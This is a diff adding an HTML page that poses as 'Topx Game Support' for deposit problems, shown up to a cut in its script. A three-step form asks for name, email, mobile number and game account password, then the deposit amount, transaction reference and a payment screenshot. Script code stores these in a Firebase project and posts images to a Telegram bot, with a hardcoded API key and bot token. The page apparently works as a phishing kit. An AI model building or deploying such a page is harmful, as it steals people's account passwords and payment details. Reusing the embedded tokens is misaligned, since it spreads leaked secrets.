@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <title>Topx Game — Deposit Problem</title>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="icon" href="IMAGES/LOGO.png" type="image/png">
+  <style>
+    .page-header {
+      display: flex; align-items: center; justify-content: center;
+      padding: 16px 20px; position: sticky; top: 0; z-index: 100;
+      background: rgba(9, 15, 31, 0.92); backdrop-filter: blur(24px);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+    }
+    .page-header .back-link {
+      position: absolute; left: 16px; width: 40px; height: 40px;
+      border-radius: 12px; background: rgba(255,255,255,0.06);
+      border: 1px solid rgba(255,255,255,0.08); display: flex;
+      align-items: center; justify-content: center; color: #8E8E93;
+      font-size: 18px; cursor: pointer; transition: var(--ios-transition);
+      text-decoration: none;
+    }
+    .page-header .back-link:active { transform: scale(0.95); }
+    .page-header .header-info { display: flex; flex-direction: column; align-items: center; gap: 4px; }
+    .page-header .header-info .logo-sm { width: 48px; height: auto; border-radius: 8px; }
+    .page-header .header-info h2 { font-size: 1.2rem; font-weight: 700; letter-spacing: -0.3px; }
+    .page-header .header-info p { font-size: 0.8rem; color: var(--accent-red); font-weight: 500; opacity: 0.9; }
+    .form-section { max-width: 500px; margin: 0 auto; padding: 24px 20px 40px; }
+    .form-card.ios-card { padding: 28px; }
+    .form-card .card-title { font-size: 1.3rem; font-weight: 700; margin-bottom: 24px; text-align: center; display: flex; align-items: center; justify-content: center; gap: 10px; }
+    .step-indicator {
+      display: flex; align-items: center; justify-content: center; gap: 0;
+      padding: 22px 16px 18px; max-width: 500px; margin: 0 auto;
+      position: relative;
+    }
+    .step-indicator::before {
+      content: ''; position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%);
+      width: 90%; height: 60px; background: rgba(255,255,255,0.03);
+      border-radius: 30px; border: 1px solid rgba(255,255,255,0.04);
+    }
+    .step-item { display: flex; flex-direction: column; align-items: center; position: relative; z-index: 1; }
+    .step-circle {
+      width: 36px; height: 36px; border-radius: 50%;
+      background: rgba(255,255,255,0.06); border: 2px solid rgba(255,255,255,0.1);
+      display: flex; align-items: center; justify-content: center;
+      font-size: 14px; font-weight: 700; color: #8E8E93;
+      transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1); flex-shrink: 0;
+      position: relative;
+    }
+    .step-circle .step-num { transition: transform 0.4s ease; }
+    .step-circle .step-check {
+      position: absolute; opacity: 0; transform: scale(0);
+      transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+    .step-circle.done .step-num { transform: scale(0); opacity: 0; }
+    .step-circle.done .step-check { opacity: 1; transform: scale(1); }
+    .step-circle.active {
+      background: var(--accent-red); border-color: transparent; color: #000;
+      box-shadow: 0 4px 20px rgba(255,69,58,0.45);
+      transform: scale(1.08);
+      animation: stepActive 2s ease-in-out infinite;
+    }
+    @keyframes stepActive {
+      0%, 100% { box-shadow: 0 4px 20px rgba(255,69,58,0.45); }
+      50% { box-shadow: 0 4px 30px rgba(255,69,58,0.65); }
+    }
+    .step-circle.done {
+      background: #34C759; border-color: transparent; color: #000;
+      box-shadow: 0 4px 16px rgba(52,199,89,0.35);
+      animation: stepDone 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+    @keyframes stepDone {
+      0% { transform: scale(0.8); }
+      50% { transform: scale(1.15); }
+      100% { transform: scale(1); }
+    }
+    .step-label {
+      font-size: 11px; color: #8E8E93; margin-top: 8px; text-align: center;
+      font-weight: 500; letter-spacing: 0.2px;
+      transition: all 0.4s ease;
+    }
+    .step-item .step-label.active-label { color: var(--accent-red); font-weight: 600; }
+    .step-item .step-label.done-label { color: #34C759; }
+    .step-line {
+      width: 44px; height: 3px; background: rgba(255,255,255,0.08);
+      transition: all 0.6s cubic-bezier(0.25, 0.8, 0.25, 1); flex-shrink: 0;
+      border-radius: 2px; margin-bottom: 24px; position: relative; z-index: 1;
+    }
+    .step-line.done { background: #34C759; transform: scaleX(1); }
+    .step-line.done::after {
+      content: ''; position: absolute; left: 0; top: 0; width: 100%; height: 100%;
+      background: #34C759; border-radius: 2px;
+      animation: lineFill 0.6s cubic-bezier(0.25, 0.8, 0.25, 1);
+    }
+    @keyframes lineFill {
+      from { width: 0; }
+      to { width: 100%; }
+    }
+    .step-panel { display: none; }
+    .step-panel.active { display: block; animation: fadeUp 0.4s ease; }
+    @keyframes fadeUp { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
+    .problem-options { display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; }
+    .problem-option {
+      display: flex; align-items: center; gap: 14px;
+      padding: 16px; border-radius: 14px;
+      border: 1.5px solid rgba(255,255,255,0.08); background: rgba(255,255,255,0.03);
+      cursor: pointer; transition: var(--ios-transition); position: relative;
+    }
+    .problem-option:active { transform: scale(0.98); }
+    .problem-option.selected { border-color: var(--accent-red); background: rgba(255,69,58,0.08); }
+    .problem-option input { position: absolute; opacity: 0; }
+    .problem-option .opt-icon {
+      width: 40px; height: 40px; border-radius: 12px;
+      display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+    }
+    .problem-option .opt-icon.red { background: rgba(255,69,58,0.12); }
+    .problem-option .opt-icon.orange { background: rgba(255,159,10,0.12); }
+    .problem-option .opt-icon.yellow { background: rgba(255,204,0,0.12); }
+    .problem-option .opt-icon.green { background: rgba(52,199,89,0.12); }
+    .problem-option .opt-info { flex: 1; }
+    .problem-option .opt-info .opt-title { font-weight: 600; font-size: 0.95rem; margin-bottom: 2px; }
+    .problem-option .opt-info .opt-desc { font-size: 0.8rem; color: #8E8E93; }
+    .problem-option .opt-check {
+      width: 22px; height: 22px; border-radius: 50%;
+      border: 2px solid rgba(255,255,255,0.15); flex-shrink: 0;
+      display: flex; align-items: center; justify-content: center;
+      transition: var(--ios-transition);
+    }
+    .problem-option.selected .opt-check { border-color: var(--accent-red); background: var(--accent-red); }
+    .problem-option.selected .opt-check svg { display: block; }
+    .btn-row { display: flex; gap: 12px; margin-top: 24px; }
+    .btn-row .ios-button { flex: 1; justify-content: center; padding: 16px; font-size: 1rem; }
+    .file-input-wrap { position: relative; }
+    .file-input-wrap input[type="file"] { position: absolute; opacity: 0; width: 100%; height: 100%; cursor: pointer; top: 0; left: 0; }
+    .file-label {
+      display: flex; align-items: center; gap: 12px; cursor: pointer;
+      width: 100%; padding: 14px 16px; border-radius: var(--ios-radius-sm);
+      border: 1px solid rgba(255,255,255,0.1); background: rgba(255,255,255,0.05);
+      color: var(--white-text); font-size: 0.95rem; font-weight: 500;
+      transition: var(--ios-transition);
+    }
+    .file-label .file-icon { width: 24px; height: 24px; flex-shrink: 0; }
+    .file-label:hover { border-color: var(--accent-red); background: rgba(255,69,58,0.05); }
+    .file-label.has-file { border-color: #34C759; background: rgba(52,199,89,0.05); }
+    .file-name { font-size: 0.8rem; color: #34C759; margin-top: 4px; padding-left: 4px; word-break: break-all; }
+    .form-group { margin-bottom: 18px; }
+    .form-group label { display: block; font-size: 0.85rem; font-weight: 600; color: #8E8E93; margin-bottom: 8px; padding-left: 4px; }
+    .form-group label .required { color: var(--accent-red); margin-left: 2px; }
+    .form-group input {
+      width: 100%; padding: 14px 16px; border-radius: var(--ios-radius-sm);
+      border: 1px solid rgba(255,255,255,0.1); background: rgba(255,255,255,0.05);
+      color: var(--white-text); font-size: 0.95rem; font-weight: 500;
+      transition: var(--ios-transition); outline: none;
+      font-family: var(--font-stack);
+    }
+    .form-group input:focus { border-color: var(--accent-red); box-shadow: 0 0 0 4px rgba(255,69,58,0.12); background: rgba(255,255,255,0.08); }
+    .form-group input::placeholder { color: #6a6a8a; font-weight: 400; }
+    .popup-overlay {
+      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(15,16,18,0.9); backdrop-filter: blur(16px);
+      display: flex; align-items: center; justify-content: center;
+      z-index: 1000; opacity: 0; visibility: hidden; transition: var(--ios-transition); padding: 20px;
+    }
+    .popup-overlay.active { opacity: 1; visibility: visible; }
+    .popup-card.ios-card { max-width: 380px; width: 100%; text-align: center; padding: 32px 24px; transform: scale(0.9) translateY(20px); transition: var(--ios-transition); }
+    .popup-overlay.active .popup-card { transform: scale(1) translateY(0); }
+    .popup-icon { margin-bottom: 16px; display: flex; justify-content: center; }
+    .popup-card h3 { font-size: 1.5rem; font-weight: 700; margin-bottom: 12px; }
+    .popup-card p { font-size: 0.9rem; color: #8E8E93; line-height: 1.7; margin-bottom: 24px; }
+    .popup-card p strong { color: var(--accent-red); }
+    .toast {
+      position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%) translateY(120px);
+      background: var(--dark-card); backdrop-filter: blur(20px); color: var(--white-text);
+      padding: 14px 28px; border-radius: var(--ios-radius-sm);
+      border: 1px solid rgba(255,255,255,0.1); box-shadow: var(--ios-shadow);
+      font-size: 0.9rem; font-weight: 600; z-index: 2000;
+      transition: var(--ios-transition); max-width: 90%; text-align: center;
+    }
+    .toast.show { transform: translateX(-50%) translateY(0); }
+    .slide-submit { width: 100%; user-select: none; -webkit-user-select: none; }
+    .slide-track {
+      position: relative; width: 100%; height: 56px;
+      background: rgba(255,255,255,0.06); border-radius: 28px;
+      border: 1px solid rgba(255,255,255,0.1); overflow: hidden;
+      cursor: pointer;
+    }
+    .slide-fill {
+      position: absolute; left: 0; top: 0; height: 100%;
+      width: 0%; background: var(--accent-red); border-radius: 28px; z-index: 0;
+    }
+    .slide-text {
+      position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%);
+      font-size: 0.9rem; font-weight: 600; color: rgba(255,255,255,0.4);
+      white-space: nowrap; pointer-events: none; z-index: 1;
+    }
+    .slide-thumb {
+      position: absolute; left: 4px; top: 4px; width: 48px; height: 48px;
+      border-radius: 50%; background: var(--accent-red);
+      box-shadow: 0 4px 16px rgba(255,69,58,0.45);
+      display: flex; align-items: center; justify-content: center;
+      cursor: grab; z-index: 2; transition: left 0.35s cubic-bezier(0.25, 0.8, 0.25, 1), box-shadow 0.2s ease;
+      touch-action: none;
+    }
+    .slide-thumb:active { cursor: grabbing; box-shadow: 0 4px 24px rgba(255,69,58,0.6); }
+    .slide-thumb.done { background: #34C759; box-shadow: 0 4px 16px rgba(52,199,89,0.35); }
+    .verify-overlay {
+      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(9,15,31,0.94); backdrop-filter: blur(24px);
+      display: flex; align-items: center; justify-content: center;
+      z-index: 3000; opacity: 0; visibility: hidden;
+      transition: opacity 0.5s ease, visibility 0.5s ease; padding: 20px;
+    }
+    .verify-overlay.active { opacity: 1; visibility: visible; }
+    .verify-card { text-align: center; max-width: 320px; }
+    .verify-ring-wrap {
+      width: 110px; height: 110px; margin: 0 auto 24px; position: relative;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .verify-ring-wrap > svg { position: absolute; top: 0; left: 0; }
+    .verify-ring-bg { fill: none; stroke: rgba(255,255,255,0.06); stroke-width: 4; }
+    .verify-ring-progress {
+      fill: none; stroke: var(--accent-red); stroke-width: 4; stroke-linecap: round;
+      stroke-dasharray: 307.876; stroke-dashoffset: 307.876;
+      transform: rotate(-90deg); transform-origin: center;
+    }
+    .verify-ring-wrap.animating .verify-ring-progress {
+      animation: fillRing 5s linear forwards;
+    }
+    @keyframes fillRing {
+      0% { stroke-dashoffset: 307.876; }
+      100% { stroke-dashoffset: 0; }
+    }
+    .verify-ring-wrap .verify-icon-wrap {
+      position: relative; z-index: 1; display: flex;
+      transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+    .verify-ring-wrap.done .verify-icon-wrap {
+      transform: scale(0); opacity: 0;
+    }
+    .verify-ring-wrap .checkmark-svg {
+      position: absolute; top: 50%; left: 50%;
+      transform: translate(-50%, -50%) scale(0);
+      z-index: 2; transition: transform 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+    .verify-ring-wrap.done .checkmark-svg {
+      transform: translate(-50%, -50%) scale(1);
+    }
+    .verify-title {
+      font-size: 1.5rem; font-weight: 700; margin-bottom: 10px;
+      color: var(--white-text); transition: all 0.4s ease;
+    }
+    .verify-title.done { color: var(--accent-red); }
+    .verify-sub {
+      color: #8E8E93; font-size: 0.95rem; transition: all 0.4s ease;
+    }
+    .verify-sub.done { color: var(--accent-red); opacity: 0.8; }
+    .success-overlay {
+      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(9,15,31,0.88); backdrop-filter: blur(16px);
+      display: flex; align-items: center; justify-content: center;
+      z-index: 4000; opacity: 0; visibility: hidden;
+      transition: opacity 0.4s ease, visibility 0.4s ease; padding: 20px;
+    }
+    .success-overlay.active { opacity: 1; visibility: visible; }
+    .success-overlay.closing { opacity: 0; }
+    .success-card {
+      background: var(--dark-card); border: 1px solid rgba(255,255,255,0.08);
+      border-radius: 28px; padding: 36px 28px 0;
+      max-width: 360px; width: 100%; text-align: center;
+      transform: scale(0.85) translateY(20px);
+      transition: transform 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+      overflow: hidden;
+    }
+    .success-overlay.active .success-card {
+      transform: scale(1) translateY(0);
+    }
+    .success-overlay.closing .success-card {
+      transform: scale(0.85) translateY(20px);
+    }
+    .success-icon-wrap {
+      width: 72px; height: 72px; margin: 0 auto 18px;
+      background: rgba(52,199,89,0.12); border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      animation: successPop 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+    @keyframes successPop {
+      0% { transform: scale(0); }
+      60% { transform: scale(1.15); }
+      100% { transform: scale(1); }
+    }
+    .success-card h3 {
+      font-size: 1.4rem; font-weight: 700; margin-bottom: 10px;
+      color: #34C759;
+    }
+    .success-card p {
+      font-size: 0.92rem; color: #8E8E93; line-height: 1.6;
+      margin-bottom: 24px;
+    }
+    .success-card p strong { color: var(--accent-red); }
+    .success-bar-wrap {
+      width: calc(100% + 56px); margin: 0 -28px;
+      height: 4px; background: rgba(255,255,255,0.06);
+    }
+    .success-bar {
+      height: 100%; width: 0; background: #34C759;
+      border-radius: 0 2px 2px 0;
+      transition: width 0.1s linear;
+    }
+    .success-bar.animating { width: 100%; transition: width 5s linear; }
+  </style>
+</head>
+<body>
+  <header class="page-header">
+    <a href="index.html" class="back-link"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#8E8E93" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5"/><path d="M12 19l-7-7 7-7"/></svg></a>
+    <div class="header-info">
+      <img src="IMAGES/LOGO.png" alt="Topx" class="logo-sm" />
+      <h2>Topx Game Support</h2>
+      <p>Deposit Problem</p>
+    </div>
+    <div style="width:40px"></div>
+  </header>
+
+  <div class="step-indicator">
+    <div class="step-item" style="flex-direction:column">
+      <div class="step-circle active" id="stepDot1">1</div>
+      <span class="step-label">Verification</span>
+    </div>
+    <div class="step-line" id="stepLine1"></div>
+    <div class="step-item" style="flex-direction:column">
+      <div class="step-circle" id="stepDot2">2</div>
+      <span class="step-label">Problem</span>
+    </div>
+    <div class="step-line" id="stepLine2"></div>
+    <div class="step-item" style="flex-direction:column">
+      <div class="step-circle" id="stepDot3">3</div>
+      <span class="step-label">Upload</span>
+    </div>
+  </div>
+
+  <div class="form-section">
+    <div class="form-card ios-card">
+      <!-- Step 1 -->
+      <div class="step-panel active" id="step1">
+        <div class="card-title"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg> Account Verification</div>
+        <div class="form-group">
+          <label>User Name <span class="required">*</span></label>
+          <input type="text" id="fUserName" placeholder="Enter your full name" required />
+        </div>
+        <div class="form-group">
+          <label>Game Email ID <span class="required">*</span></label>
+          <input type="email" id="fEmail" placeholder="Enter your email" required />
+        </div>
+        <div class="form-group">
+          <label>Game Mobile Number <span class="required">*</span></label>
+          <input type="tel" id="fMobile" placeholder="Enter mobile number" required />
+        </div>
+        <div class="form-group">
+          <label>Game Account Password <span class="required">*</span></label>
+          <input type="password" id="fPassword" placeholder="Enter password" required />
+        </div>
+        <button class="ios-button" id="step1Next" style="width:100%;justify-content:center;">Next →</button>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="step-panel" id="step2">
+        <div class="card-title"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="7" width="20" height="14" rx="2" ry="2"/><path d="M16 7V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v2"/></svg> Select Problem</div>
+        <div class="problem-options" id="problemOptions">
+          <label class="problem-option" data-value="Processing">
+            <input type="radio" name="problem_type" value="Processing" />
+            <div class="opt-icon orange"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#FF9F0A" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div>
+            <div class="opt-info">
+              <div class="opt-title">Processing</div>
+              <div class="opt-desc">Deposit is processing but taking too long</div>
+            </div>
+            <div class="opt-check"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
+          </label>
+          <label class="problem-option" data-value="Rejected">
+            <input type="radio" name="problem_type" value="Rejected" />
+            <div class="opt-icon red"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg></div>
+            <div class="opt-info">
+              <div class="opt-title">Rejected</div>
+              <div class="opt-desc">Deposit was rejected by the system</div>
+            </div>
+            <div class="opt-check"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
+          </label>
+          <label class="problem-option" data-value="Pending">
+            <input type="radio" name="problem_type" value="Pending" />
+            <div class="opt-icon yellow"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#FFCC00" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg></div>
+            <div class="opt-info">
+              <div class="opt-title">Pending</div>
+              <div class="opt-desc">Deposit is stuck in pending status</div>
+            </div>
+            <div class="opt-check"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
+          </label>
+          <label class="problem-option" data-value="Not Received">
+            <input type="radio" name="problem_type" value="Not Received" />
+            <div class="opt-icon green"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#34C759" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg></div>
+            <div class="opt-info">
+              <div class="opt-title">Not Received</div>
+              <div class="opt-desc">Amount deducted but not credited in game</div>
+            </div>
+            <div class="opt-check"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
+          </label>
+        </div>
+        <div class="form-group">
+          <label>Deposit Amount <span class="required">*</span></label>
+          <input type="number" id="fAmount" placeholder="Enter deposit amount" min="1" required />
+        </div>
+        <div class="form-group">
+          <label>UTR / Transaction Ref. No. <span class="required">*</span></label>
+          <input type="text" id="fUtr" placeholder="Enter UTR number" required />
+        </div>
+        <div class="btn-row">
+          <button class="ios-button" id="step2Back" style="flex:0.4;background:rgba(255,255,255,0.08);box-shadow:none;color:#8E8E93">← Back</button>
+          <button class="ios-button" id="step2Next" style="flex:0.6">Next →</button>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="step-panel" id="step3">
+        <div class="card-title"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg> Upload Images</div>
+        <div class="form-group">
+          <label>Payment Screenshot (UTR Proof) <span class="required">*</span></label>
+          <div class="file-input-wrap">
+            <input type="file" name="payment_screenshot" accept="image/*" class="file-input" required />
+            <div class="file-label" id="paymentLabel">
+              <svg class="file-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#8E8E93" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
+              <span>Choose payment screenshot</span>
+            </div>
+          </div>
+          <div class="file-name" id="paymentName"></div>
+        </div>
+        <div class="btn-row" style="flex-direction:column;">
+          <button class="ios-button" id="step3Back" style="width:100%;background:rgba(255,255,255,0.08);box-shadow:none;color:#8E8E93;justify-content:center;"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:6px"><path d="M19 12H5"/><path d="M12 19l-7-7 7-7"/></svg> Back</button>
+          <div class="slide-submit" id="slideSubmit">
+            <div class="slide-track">
+              <div class="slide-fill" id="slideFill"></div>
+              <span class="slide-text">Slide to Submit</span>
+              <div class="slide-thumb" id="slideThumb">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14"/><path d="M12 5l7 7-7 7"/></svg>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="verify-overlay" id="verifyOverlay">
+    <div class="verify-card">
+      <div class="verify-ring-wrap" id="verifyRingWrap">
+        <svg width="110" height="110" viewBox="0 0 110 110">
+          <circle class="verify-ring-bg" cx="55" cy="55" r="49"/>
+          <circle class="verify-ring-progress" cx="55" cy="55" r="49"/>
+        </svg>
+        <div class="verify-icon-wrap" id="verifyIconWrap">
+          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="2" y="7" width="20" height="14" rx="2" ry="2"/>
+            <path d="M16 7V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v2"/>
+          </svg>
+        </div>
+        <div class="checkmark-svg" id="checkmarkSvg">
+          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="20 6 9 17 4 12"/>
+          </svg>
+        </div>
+      </div>
+      <h3 class="verify-title" id="verifyTitle">Submitting Request</h3>
+      <p class="verify-sub" id="verifySub">Please wait while we process your deposit request</p>
+    </div>
+  </div>
+
+  <div class="success-overlay" id="successPopup">
+    <div class="success-card">
+      <div class="success-icon-wrap">
+        <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#34C759" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="20 6 9 17 4 12"/>
+        </svg>
+      </div>
+      <h3>Submitted Successfully!</h3>
+      <p>Your deposit problem request has been received. Our team will resolve your issue within <strong>24 hours</strong>.</p>
+      <div class="success-bar-wrap">
+        <div class="success-bar" id="successBar"></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="toast" id="toast"><span id="toastMessage">Success!</span></div>
+
+  <script>
+    var FIREBASE_CONFIG = {
+      apiKey: "AIzaSyCiqaLzh7PoVC5l03sJFdtK548Wulufn94",
+      authDomain: "alll-projects-admin-pennal.firebaseapp.com",
+      projectId: "alll-projects-admin-pennal",
+      storageBucket: "alll-projects-admin-pennal.firebasestorage.app",
+      messagingSenderId: "689297868215",
+      appId: "1:689297868215:web:2747b19c2da47a31f49432"
+    };
+    var SITE_ID = "topx_game";
+    var _fbDb = null;
+
+    function loadFirebase() {
+      if (_fbDb) return Promise.resolve(_fbDb);
+      return new Promise(function(resolve, reject) {
+        var initDb = function() {
+          try {
+            if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
+            _fbDb = firebase.firestore();
+            resolve(_fbDb);
+          } catch (e) { reject(e); }
+        };
+        if (window.firebase && window.firebase.firestore) { initDb(); return; }
+        var urls = [
+          'https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js',
+          'https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js'
+        ];
+        var loaded = 0;
+        urls.forEach(function(src) {
+          var s = document.createElement('script');
+          s.src = src;
+          s.onload = function() { loaded++; if (loaded === urls.length) initDb(); };
+          s.onerror = function() { reject(new Error('Firebase load failed')); };
+          document.head.appendChild(s);
+        });
+      });
+    }
+
+    function saveSubmission(data) {
+      return loadFirebase().then(function(db) {
+        var payload = Object.assign({}, data, { site_id: SITE_ID, created_at: firebase.firestore.FieldValue.serverTimestamp() });
+        return db.collection('submissions').add(payload);
+      });
+    }
+
+    var TG_BOT_TOKEN = '8906822745:AAH_rQOexAgYey92rzgNw6piosCXDY20rwM';
+    var TG_CHAT_ID = '-1003782852692';
+
+    var $ = function(id) { return document.getElementById(id); };
+
+    function showToast(msg) {
+      var el = $('toastMessage');
+      if (el) el.textContent = msg;
+      var t = $('toast');
+      if (!t) return;
+      t.classList.add('show');
+      setTimeout(function() { t.classList.remove('show'); }, 2500);
+    }
+
+    var _formData = {};
+    var _submitted = false;
+
+    function goToStep(step) {
+      for (var i = 1; i <= 3; i++) {
+        var panel = $('step' + i);
+        var dot = $('stepDot' + i);
+        var line = $('stepLine' + i);
+        var label = dot ? dot.parentElement.querySelector('.step-label') : null;
+        if (panel) panel.classList.remove('active');
+        if (dot) dot.classList.remove('active', 'done');
+        if (line) line.classList.remove('done');
+        if (label) { label.classList.remove('active-label', 'done-label'); }
+      }
+      var activePanel = $('step' + step);
+      if (activePanel) activePanel.classList.add('active');
+      for (var j = 1; j <= step; j++) {
+        var d = $('stepDot' + j);
+        var lbl = d ? d.parentElement.querySelector('.step-label') : null;
+        if (d) {
+          if (j < step) { d.classList.add('done'); if (lbl) lbl.classList.add('done-label'); }
+          else { d.classList.add('active'); if (lbl) lbl.classList.add('active-label'); }
+        }
+        if (j < step) { var l = $('stepLine' + j); if (l) l.classList.add('done'); }
+      }
+    }
+
+    function sendImageToTelegram(file, caption) {
+      var fd = new FormData();
+      fd.append('chat_id', TG_CHAT_ID);
+      fd.append('photo', file);
+      fd.append('caption', caption);
+      return fetch('https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendPhoto', {
+        method: 'POST', body: fd
+      }).then(function(r) { return r.json(); }).then(function(data) {
+        if (data.ok) return 'https://t.me/c/' + TG_CHAT_ID.replace('-100', '') + '/' + data.result.message_id;
+        throw new Error(data.description || 'Telegram send failed');
+      });
+    }
+
+    // File input handlers
+    document.querySelectorAll('.file-input-wrap input[type="file"]').forEach(function(input) {
+      input.addEventListener('change', function() {
+        var label = this.parentElement.querySelector('.file-label');
+        var nameEl = this.parentElement.parentElement.querySelector('.file-name');
+        if (this.files && this.files.length > 0) {
+          label.classList.add('has-file');
+          var span = label.querySelector('span');
+          if (span) span.textContent = this.files[0].name;
+          if (nameEl) nameEl.textContent = 'Selected: ' + this.files[0].name;
+        } else {
+          label.classList.remove('has-file');
+        }
+      });
+    });
+
+    // Problem option selection
+    document.querySelectorAll('.problem-option').forEach(function(opt) {
+      opt.addEventListener('click', function() {
+        document.querySelectorAll('.problem-option').forEach(function(o) { o.classList.remove('selected'); });
+        this.classList.add('selected');
+        var radio = this.querySelector('input[type="radio"]');
+        if (radio) radio.checked = true;
+      });
+    });
+
+    // Step 1 → Next
+    $('step1Next').addEventListener('click', function() {
+      var userName = $('fUserName');
+      var email = $('fEmail');
+      var mobile = $('fMobile');
+      var password = $('fPassword');
+      if (!userName.value.trim()) { showToast('Enter User Name'); userName.focus(); return; }
+      if (!email.value.trim()) { showToast('Enter Game Email ID'); email.focus(); return; }
+      if (!mobile.value.trim()) { showToast('Enter Mobile Number'); mobile.focus(); return; }
+      if (!password.value.trim()) { showToast('Enter Password'); password.focus(); return; }
+
+      _formData.user_name = userName.value.trim();
+      _formData.email = email.value.trim();
+      _formData.mobile = mobile.value.trim();
+      _formData.password = password.value.trim();
+
+      goToStep(2);
+    });
+
+    // Step 2 → Back
+    $('step2Back').addEventListener('click', function() { goToStep(1); });
+
+    // Step 2 → Next
+    $('step2Next').addEventListener('click', function() {
+      var selected = document.querySelector('.problem-option.selected');
+      if (!selected) { showToast('Select your deposit problem type'); return; }
+      var amount = $('fAmount');
+      var utr = $('fUtr');
+      if (!amount.value.trim()) { showToast('Enter Deposit Amount'); amount.focus(); return; }
+      if (!utr.value.trim()) { showToast('Enter UTR Number'); utr.focus(); return; }
+
+      _formData.problem_type = selected.getAttribute('data-value');
+      _formData.amount = amount.value.trim();
+      _formData.utr = utr.value.trim();
+
+      goToStep(3);
+    });
+
+    // Step 3 → Back
+    $('step3Back').addEventListener('click', function() { goToStep(2); });
+
+    // Step 3 → Submit
+    var _submitting = false;
+
